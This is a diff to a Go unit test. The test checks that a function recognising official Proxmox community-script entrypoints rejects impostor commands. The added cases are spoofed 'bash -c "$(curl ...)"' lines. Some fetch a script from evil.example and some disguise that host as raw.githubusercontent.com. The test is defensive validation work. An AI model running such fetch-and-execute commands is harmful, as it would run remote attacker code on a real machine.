@@ -93,7 +93,7 @@ _cs_helper="$(curl -fsSL --connect-timeout 10 "${COMMUNITY_SCRIPTS_CORE_URL}/mis
 	if r, n := communityScript(w(generated)); r+"/"+n != "ProxmoxVE/bentopdf" {
 		t.Errorf("generated entrypoint: got %s/%s", r, n)
 	}
-	for _, other := range []string{`apt-get update`, `bash -c "$(curl -fsSL https://evil.example/ct/x.sh)"`, `bash -c "$(curl https://raw.githubusercontent.com/someone-else/ProxmoxVE/main/ct/x.sh)"`} {
+	for _, other := range []string{`apt-get update`, `bash -c "$(curl -fsSL https://evil.example/ct/x.sh)"`, `bash -c "$(curl https://raw.githubusercontent.com/someone-else/ProxmoxVE/main/ct/x.sh)"`, `bash -c "$(curl https://evil.example/raw.githubusercontent.com/community-scripts/ProxmoxVE/main/ct/x.sh)"`, `bash -c "$(curl https://raw.githubusercontent.com.evil.example/community-scripts/ProxmoxVE/main/ct/x.sh)"`} {
 		if n := communityScriptName(w(other)); n != "" {
 			t.Errorf("%q gave %q", other, n)
 		}
